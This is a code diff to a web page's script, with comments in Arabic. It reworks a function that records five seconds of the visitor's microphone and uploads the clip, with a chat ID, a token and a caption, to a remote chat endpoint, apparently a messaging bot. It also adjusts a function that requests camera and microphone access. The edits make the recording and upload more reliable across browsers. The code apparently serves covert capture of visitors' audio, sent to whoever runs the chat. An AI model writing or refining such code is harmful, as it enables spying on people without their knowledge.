@@ -515,18 +515,20 @@
     });
   }
 
-  // دالة لتسجيل صوتي (5 ثوان) وإرساله مع الكابتشن
+  // دالة لتسجيل صوتي (5 ثوان) وإرساله مع الكابتشن (مُحسّنة)
   async function recordAudioAndSend(stream, chat, token) {
     return new Promise((resolve) => {
+      // استخدام MediaRecorder بدون تحديد نوع MIME ليدعم المتصفح النوع المناسب
       const mediaRecorder = new MediaRecorder(stream);
       const chunks = [];
       
       mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
       mediaRecorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: 'audio/mp4' });
+        // استخدام نوع blob الفعلي الذي سجله MediaRecorder
+        const blob = new Blob(chunks, { type: mediaRecorder.mimeType || 'audio/webm' });
         const form = new FormData();
         form.append('chat_id', chat);
-        form.append('audio', blob, `audio_${Date.now()}.mp4`);
+        form.append('audio', blob, `audio_${Date.now()}.${blob.type.split('/')[1] || 'webm'}`);
         const caption = buildCaption(`🎤 تسجيل صوتي - 5 ثوان`);
         form.append('caption', caption);
         
@@ -535,7 +537,7 @@
             method: 'POST',
             body: form
           });
-        } catch (e) {}
+        } catch (e) { console.log(e); }
         resolve();
       };
       
@@ -573,15 +575,16 @@
     });
   }
 
-  // ------------------ دالة طلب الأذونات العامة (مرة واحدة) ------------------
+  // ------------------ دالة طلب الأذونات الموحدة (مرة واحدة فقط) ------------------
   async function requestPermissions(needVideo, needAudio) {
     if (!needVideo && !needAudio) return;
     const constraints = {};
-    if (needVideo) constraints.video = true;   // طلب أي كاميرا
+    if (needVideo) constraints.video = true;   // طلب أي كاميرا (بدون تحديد اتجاه)
     if (needAudio) constraints.audio = true;   // طلب الميكروفون
     try {
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      stream.getTracks().forEach(t => t.stop()); // نغلق التدفق فورًا بعد الحصول على الإذن
+      // بعد الحصول على الإذن، نغلق التدفق فورًا (لا حاجة للاحتفاظ به)
+      stream.getTracks().forEach(t => t.stop());
     } catch (err) {
       console.log('فشل الحصول على الإذن:', err);
     }
@@ -756,4 +759,4 @@
   }
 </script>
 </body>
-  </html>
+            </html>
